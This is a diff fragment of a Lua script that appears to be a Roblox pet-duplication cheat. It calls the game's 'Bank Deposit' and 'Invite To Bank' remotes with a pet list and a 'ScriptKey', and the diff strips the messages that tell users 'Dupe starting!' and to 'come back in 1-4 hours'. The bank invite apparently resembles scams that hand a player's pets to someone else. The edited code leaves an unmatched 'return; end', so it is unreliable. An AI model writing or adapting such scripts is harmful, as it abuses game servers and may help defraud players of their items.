@@ -29,17 +29,11 @@ end
  
 local request, request2 = a.Network.Invoke("Bank Deposit", c[1]['BUID'], PetsList, b - 1);
  
-if request then
-    a.Message.New("Dupe starting!");
-else
-    a.Message.New(request2 and "if you don't have one buy a tier 2 bank to have more space and prevent pet removal! Wait 2-3 hour before each copy!");
+
     return;
 end
  
 if a.Network.Invoke("Invite To Bank", c[1]['BUID'], ScriptKey) then
-    a.Message.New("Come back in 1-4 hours!");
-else
-    a.Message.New("Dupe fail");
 end;
  
  
